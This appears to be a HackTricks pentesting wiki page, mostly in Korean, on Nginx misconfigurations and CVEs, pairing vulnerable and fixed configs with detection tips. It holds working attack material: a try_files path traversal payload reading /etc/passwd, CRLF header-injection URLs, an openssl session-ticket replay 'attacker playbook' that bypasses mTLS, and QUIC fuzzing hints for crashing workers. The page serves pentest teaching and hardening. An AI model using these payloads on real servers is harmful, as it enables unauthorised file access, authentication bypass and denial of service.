# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Missing root location <a href="#missing-root-location" id="missing-root-location"></a>

Nginx 서버를 구성할 때, **root directive**는 파일이 제공되는 기본 디렉터리를 정의하여 중요한 역할을 합니다. 아래 예제를 살펴보세요:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In this configuration, `/etc/nginx` is designated as the root directory. This setup allows access to files within the specified root directory, such as `/hello.txt`. However, it's crucial to note that only a specific location (`/hello.txt`) is defined. There's no configuration for the root location (`location / {...}`). This omission means that the root directive applies globally, enabling requests to the root path `/` to access files under `/etc/nginx`.

이 구성에서는 `/etc/nginx`가 루트 디렉터리로 지정되어 있습니다. 이 설정은 `/hello.txt`와 같이 지정된 루트 디렉터리 내의 파일들에 대한 접근을 허용합니다. 그러나 중요한 점은 특정 location(`/hello.txt`)만 정의되어 있다는 것입니다. 루트 location(`location / {...}`)에 대한 설정이 없기 때문에, 이 누락으로 인해 root 지시어가 전역적으로 적용되어 루트 경로 `/`에 대한 요청이 `/etc/nginx` 아래의 파일들에 접근할 수 있게 됩니다.

A critical security consideration arises from this configuration. A simple `GET` request, like `GET /nginx.conf`, could expose sensitive information by serving the Nginx configuration file located at `/etc/nginx/nginx.conf`. Setting the root to a less sensitive directory, like `/etc`, could mitigate this risk, yet it still may allow unintended access to other critical files, including other configuration files, access logs, and even encrypted credentials used for HTTP basic authentication.

이 구성으로 인해 중요한 보안 문제가 발생합니다. `GET` 요청(예: `GET /nginx.conf`) 하나로 `/etc/nginx/nginx.conf`에 위치한 Nginx 구성 파일이 서빙되어 민감한 정보가 노출될 수 있습니다. root를 `/etc`와 같은 덜 민감한 디렉터리로 설정하면 이 위험을 완화할 수 있지만, 여전히 다른 구성 파일들, 접근 로그(access logs), 심지어 HTTP basic authentication에 사용되는 암호화된 자격 증명 등 의도하지 않은 민감한 파일들에 대한 접근을 허용할 가능성이 남습니다.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In the configuration files of Nginx, a close inspection is warranted for the "location" directives. A vulnerability known as Local File Inclusion (LFI) can be inadvertently introduced through a configuration that resembles the following:

Nginx의 구성 파일에서는 `location` 지시어를 면밀히 검사해야 합니다. 다음과 유사한 구성으로 인해 Local File Inclusion (LFI) 취약점이 의도치 않게 도입될 수 있습니다:
```
location /imgs {
alias /path/images/;
}
```
이 구성은 서버가 `/imgs../flag.txt` 같은 요청을 의도한 디렉터리 외부의 파일에 접근하려는 시도로 해석하여 사실상 `/path/images/../flag.txt`로 해석되기 때문에 LFI에 취약합니다. 이 결함을 통해 공격자는 웹을 통해 접근할 수 없어야 할 서버의 파일시스템에서 파일을 가져올 수 있습니다.

이 취약점을 완화하려면 구성을 다음과 같이 조정해야 합니다:
```
location /imgs/ {
alias /path/images/;
}
```
추가 정보: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix 테스트:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## 안전하지 않은 경로 제한 <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

다음 페이지를 확인하여 다음과 같은 지시어를 우회하는 방법을 알아보세요:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Unsafe variable use / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> 취약한 변수 `$uri` 및 `$document_ur`i가 있으며, 이는 `$request_uri`로 교체하여 해결할 수 있습니다.
>
> 다음과 같은 정규식도 취약할 수 있습니다:
>
> `location ~ /docs/([^/])? { … $1 … }` - 취약
>
> `location ~ /docs/([^/\s])? { … $1 … }` - 취약하지 않음 (공백 검사)
>
> `location ~ /docs/(.*)? { … $1 … }` - 취약하지 않음

아래 예시는 Nginx 설정의 취약점을 보여줍니다:
```
location / {
return 302 https://example.com$uri;
}
```
문자 `\r` (Carriage Return)과 `\n` (Line Feed)은 HTTP 요청에서 새 줄 문자를 나타내며, 이들의 URL-encoded 형태는 `%0d%0a`로 표현됩니다. 이러한 문자를 요청(예: `http://localhost/%0d%0aDetectify:%20clrf`)에 포함시키면, 잘못 구성된 서버는 `Detectify`라는 새 헤더를 발행합니다. 이는 `$uri` 변수가 URL-encoded된 새 줄 문자를 디코딩하여 응답에 예기치 않은 헤더가 포함되기 때문입니다:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection과 response splitting의 위험에 대해 자세히 알아보려면 [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

또한 이 기법은 [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77)에서 몇 가지 취약한 예제와 탐지 메커니즘과 함께 설명됩니다. 예를 들어, blackbox 관점에서 이 misconfiguration을 탐지하려면 다음 요청들을 시도할 수 있습니다:

- `https://example.com/%20X` - 임의의 HTTP 코드
- `https://example.com/%20H` - 400 Bad Request

만약 취약하다면, 첫 번째는 "X"가 어떤 HTTP method여도 응답을 반환하고, 두 번째는 "H"가 유효한 method가 아니기 때문에 오류를 반환합니다. 그래서 서버는 `GET / H HTTP/1.1`과 같은 요청을 받게 되고 이로 인해 오류가 발생합니다.

또 다른 탐지 예시는 다음과 같습니다:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - 임의의 HTTP 코드
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

해당 발표에서 제시된 일부 취약한 구성 예시는 다음과 같습니다:

- 최종 URL에서 **`$uri`**가 그대로 설정된 것을 주목하세요.
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- 다시 **`$uri`**가 URL에 포함된 것을 주목하세요 (이번에는 파라미터 안에 있음)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- 이제 AWS S3에서
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### 어떤 변수든

특정 상황에서 사용자 제공 데이터(user-supplied data)가 Nginx 변수로 처리될 수 있음이 발견되었습니다. 이 동작의 원인은 다소 불분명하지만, 드문 현상도 아니고 검증이 간단하지도 않습니다. 이 이상 현상은 HackerOne의 보안 보고서에서 강조되었으며, 해당 보고서는 [here](https://hackerone.com/reports/370094)에서 확인할 수 있습니다. 오류 메시지를 추가 조사한 결과 [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365)에서 발생함이 확인되었고, Server Side Includes (SSI)가 근본 원인으로 지목되었습니다.

이를 탐지하기 위해 변수 출력 여부를 테스트하기 위해 referer 헤더를 설정하는 다음 명령을 실행할 수 있습니다:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
이 설정 오류에 대한 시스템 전반의 스캔에서 사용자가 Nginx 변수를 출력할 수 있는 여러 사례가 발견되었다. 하지만 취약한 인스턴스 수가 감소한 것으로 보아 이 문제를 수정하려는 조치가 어느 정도 성공을 거둔 것으로 보인다.

### try_files를 $URI$ARGS 변수와 함께 사용하기

다음과 같은 Nginx 설정 오류는 LFI 취약점을 초래할 수 있다:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
우리 설정에서는 지정된 순서로 파일의 존재를 확인하는 데 사용되는 `try_files` 지시어가 있습니다. Nginx는 찾은 첫 번째 파일을 제공합니다. `try_files` 지시어의 기본 문법은 다음과 같습니다:
```
try_files file1 file2 ... fileN fallback;
```
Nginx는 지정된 순서대로 각 파일의 존재를 확인합니다. 파일이 존재하면 즉시 서빙됩니다. 지정된 파일이 하나도 존재하지 않으면 요청은 다른 URI나 특정 오류 페이지가 될 수 있는 폴백 옵션으로 전달됩니다.

하지만 이 디렉티브에서 `$uri$args` 변수를 사용할 경우, Nginx는 요청 URI에 쿼리 문자열 인수를 결합한 것과 일치하는 파일을 찾으려고 시도합니다. 따라서 우리는 이 구성을 악용할 수 있습니다:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
다음 페이로드로:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
우리의 payload를 사용해 Nginx 설정에 정의된 root 디렉터리에서 탈출하여 `/etc/passwd` 파일을 로드합니다. 디버그 로그에서 Nginx가 파일들을 어떻게 시도하는지 관찰할 수 있습니다:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
위에서 언급한 구성으로 Nginx를 대상으로 한 PoC:
![Example burp request](../../images/nginx_try_files.png)

## 백엔드 원시 응답 읽기

Nginx는 `proxy_pass`를 통해 백엔드에서 발생한 오류와 HTTP 헤더를 가로채 내부 오류 메시지와 헤더를 숨길 수 있는 기능을 제공합니다. 이는 Nginx가 백엔드 오류에 대해 커스텀 에러 페이지를 제공함으로써 이루어집니다. 그러나 Nginx가 유효하지 않은 HTTP 요청을 받을 경우 문제가 생깁니다. 해당 요청은 수신된 그대로 백엔드로 전달되며, 백엔드의 원시 응답이 Nginx의 개입 없이 클라이언트로 직접 전송됩니다.

uWSGI 애플리케이션을 사용하는 예시 시나리오를 고려해보자:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
이를 관리하려면 Nginx 구성에서 특정 지시문을 사용합니다:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): 이 디렉티브는 상태 코드가 300보다 큰 백엔드 응답에 대해 Nginx가 사용자 지정 응답을 제공하도록 합니다. 예시 uWSGI 애플리케이션의 경우 `500 Error` 응답이 가로채져 Nginx에서 처리되도록 보장합니다.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): 이름 그대로 이 디렉티브는 클라이언트로부터 특정 HTTP 헤더를 숨겨 개인정보와 보안을 강화합니다.

유효한 `GET` 요청이 들어오면 Nginx는 정상적으로 요청을 처리하여 비밀 헤더를 드러내지 않는 표준 오류 응답을 반환합니다. 그러나 잘못된 HTTP 요청은 이 메커니즘을 우회하여 비밀 헤더와 오류 메시지를 포함한 백엔드의 원시 응답이 노출되게 만듭니다.

## merge_slashes를 off로 설정

기본적으로 Nginx의 **`merge_slashes` directive**는 **`on`**으로 설정되어 있어 URL 내 연속된 슬래시들을 단일 슬래시로 압축합니다. 이 기능은 URL 처리를 간소화하지만, 특히 local file inclusion (LFI) 공격에 취약한 애플리케이션 뒤에서 Nginx가 리버스 프록시로 동작할 때 의도치 않게 취약점을 숨길 수 있습니다. 보안 전문가인 **Danny Robinson and Rotem Bar**는 이 기본 동작과 관련된 잠재적 위험을 강조했습니다.

이러한 위험을 줄이기 위해서는 취약한 애플리케이션에 대해 **`merge_slashes` directive를 off로 설정**하는 것이 권장됩니다. 이렇게 하면 Nginx가 URL 구조를 변경하지 않고 애플리케이션으로 요청을 전달하므로 내재된 보안 문제를 가리지 않게 됩니다.

자세한 내용은 [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)를 확인하세요.

### **Maclicious Response Headers**

[**this writeup**](https://mizu.re/post/cors-playground)에 설명된 것처럼, 웹 서버의 응답에 특정 헤더가 포함되어 있으면 Nginx 프록시의 동작이 변경될 수 있습니다. 해당 헤더들은 [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)에서 확인할 수 있습니다:

- `X-Accel-Redirect`: Nginx에게 요청을 지정된 위치로 내부적으로 리다이렉트하도록 지시합니다.
- `X-Accel-Buffering`: Nginx가 응답을 버퍼링할지 여부를 제어합니다.
- `X-Accel-Charset`: X-Accel-Redirect를 사용할 때 응답의 문자셋을 설정합니다.
- `X-Accel-Expires`: X-Accel-Redirect를 사용할 때 응답의 만료 시간을 설정합니다.
- `X-Accel-Limit-Rate`: X-Accel-Redirect를 사용할 때 응답 전송 속도를 제한합니다.

예를 들어, 헤더 **`X-Accel-Redirect`** 는 nginx에서 내부 **redirect**를 발생시킵니다. 따라서 nginx 설정에 **`root /`** 같은 항목이 있고 웹 서버 응답에 **`X-Accel-Redirect: .env`** 가 포함되어 있으면 nginx는 **`/.env`**의 내용을 전송하게 되어 Path Traversal이 발생합니다.

### **Default Value in Map Directive**

**Nginx configuration**에서 `map` 디렉티브는 종종 **authorization control** 역할을 합니다. 흔한 실수는 **default** 값을 지정하지 않는 것으로, 이는 권한 없는 접근으로 이어질 수 있습니다. 예를 들면:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
`default`이 없으면 `/map-poc` 내의 **정의되지 않은 URI**에 접근하여 **악의적인 사용자**가 보안을 우회할 수 있다. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html)은 이러한 문제를 방지하기 위해 **기본값**을 설정할 것을 권장한다.

### **DNS Spoofing Vulnerability**

특정 조건에서는 Nginx에 대한 DNS spoofing이 가능하다. 공격자가 Nginx가 사용하는 **DNS server**를 알고 그 DNS queries를 가로챌 수 있다면, DNS records를 스푸핑할 수 있다. 그러나 Nginx가 DNS resolution을 위해 **localhost (127.0.0.1)**을 사용하도록 구성되어 있으면 이 방법은 효과가 없다. Nginx는 다음과 같이 DNS server를 지정할 수 있다:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` and `internal` 지시어**

The **`proxy_pass`** 지시어는 내부 또는 외부의 다른 서버로 요청을 리디렉션하는 데 사용됩니다. The **`internal`** 지시어는 특정 위치가 Nginx 내부에서만 접근 가능하도록 보장합니다. 이러한 지시어 자체가 취약점은 아니지만, 구성 설정은 보안 허점을 방지하기 위해 면밀히 검토되어야 합니다.

## proxy_set_header Upgrade & Connection

만약 nginx 서버가 Upgrade 및 Connection 헤더를 전달하도록 구성되어 있다면, [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md)를 통해 보호된/내부 엔드포인트에 접근할 수 있습니다.

> [!CAUTION]
> 이 취약점은 공격자가 **`proxy_pass` 엔드포인트와 직접 연결을 수립할 수 있게 하며** (`http://backend:9999` 이 경우), 그 콘텐츠는 nginx에 의해 검사되지 않습니다.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> proxy_pass가 특정 **경로**(예: `http://backend:9999/socket.io`)를 가리키고 있더라도 연결은 `http://backend:9999`로 수립되므로 내부 엔드포인트 내의 다른 경로로 **접근할 수 있습니다. 즉 proxy_pass URL에 경로가 지정되어 있어도 상관없습니다.**

## HTTP/3 QUIC module remote DoS & leak (2024)

During 2024 Nginx disclosed CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 and CVE-2024-35200 showing that a **single hostile QUIC session** can crash worker processes or leak memory whenever the experimental `ngx_http_v3_module` is compiled in and a `listen ... quic` socket is exposed. Impacted builds are 1.25.0–1.25.5 and 1.26.0, while 1.27.0/1.26.1 ship the fixes; the memory disclosure (CVE-2024-34161) additionally requires MTUs larger than 4096 bytes to surface sensitive data (details in the 2024 nginx advisory referenced below).

**Recon & exploitation hints**

- HTTP/3는 opt-in이므로 `Alt-Svc: h3=":443"` 응답을 스캔하거나 UDP/443에서 QUIC 핸드셰이크를 brute-force로 시도하세요; 확인되면 custom `quiche-client`/`nghttp3` payloads로 핸드셰이크와 STREAM frames를 fuzz하여 worker 프로세스 크래시를 유발하고 로그 leak을 강제하세요.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS 세션 재개로 인한 클라이언트 인증서 인증 우회 (CVE-2025-23419)

2025년 2월 발표된 advisory에 따르면 OpenSSL로 빌드된 nginx 1.11.4–1.27.3은 한 이름 기반 가상 호스트에서 성립된 **TLS 1.3 세션을 다른 호스트 내부에서 재사용**할 수 있게 허용합니다. 따라서 인증서 없이 협상된 호스트의 클라이언트는 ticket/PSK를 재생하여 `ssl_verify_client on;`으로 보호된 vhost로 침투해 mTLS를 완전히 우회할 수 있습니다. 이 버그는 여러 가상 호스트가 동일한 TLS 1.3 세션 캐시와 tickets를 공유할 때 발생합니다 (아래의 2025 nginx advisory 참조).

**공격자 플레이북**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
대상이 취약한 경우, 두 번째 핸드셰이크는 클라이언트 인증서를 제시하지 않고 완료되어 보호된 위치가 노출됩니다.

**검토 항목**

- `ssl_session_cache shared:SSL` 및 `ssl_session_tickets on;`을 공유하는 혼합된 `server_name` 블록.
- mTLS를 기대하지만 공개 호스트로부터 공유된 세션 캐시/티켓 설정을 상속받는 Admin/API 블록.
- vhost 격리를 고려하지 않고 TLS 1.3 세션 재개를 전역적으로 활성화하는 자동화(e.g., Ansible roles).

## HTTP/2 Rapid Reset 내성 (CVE-2023-44487 동작)

HTTP/2 Rapid Reset attack (CVE-2023-44487)은 운영자가 `keepalive_requests` 또는 `http2_max_concurrent_streams`를 기본값보다 높게 설정할 때 여전히 nginx에 영향을 줍니다: 공격자는 하나의 HTTP/2 연결을 열고 수천 개의 스트림으로 채운 뒤 즉시 `RST_STREAM` 프레임을 보내 동시성 상한에 도달하지 않게 하면서도 CPU는 종료 처리 로직에 계속 소모되게 합니다. nginx 기본값(동시 스트림 128, keepalive 요청 1000)은 영향 범위를 작게 유지하지만, 이러한 한계를 "상당히" 높이면 단일 클라이언트만으로도 워커를 손쉽게 고갈시킬 수 있습니다(아래 참조된 F5 문서 참조).

**탐지 팁**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
해당 지시문들이 비정상적으로 높은 값을 보이는 호스트는 주요 표적입니다. 하나의 HTTP/2 클라이언트가 스트림 생성과 즉시 `RST_STREAM` 프레임을 반복해 동시성 한도를 초과하지 않으면서도 CPU를 최고 사용 상태로 유지할 수 있습니다.

## 직접 시도해보기

Detectify는 Docker를 사용해 이 문서에서 논의된 몇몇 잘못된 구성이 포함된 취약한 Nginx 테스트 서버를 직접 설정하고 찾아볼 수 있는 GitHub 저장소를 만들었습니다!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## 정적 분석 도구

### [GIXY](https://github.com/yandex/gixy)

Gixy는 Nginx 구성을 분석하는 도구입니다. Gixy의 주요 목적은 보안 구성 오류를 방지하고 결함 탐지를 자동화하는 것입니다.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner는 일반적인 Nginx 잘못된 구성과 취약점을 찾기 위한 간단한 도구입니다.

## 참고자료

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
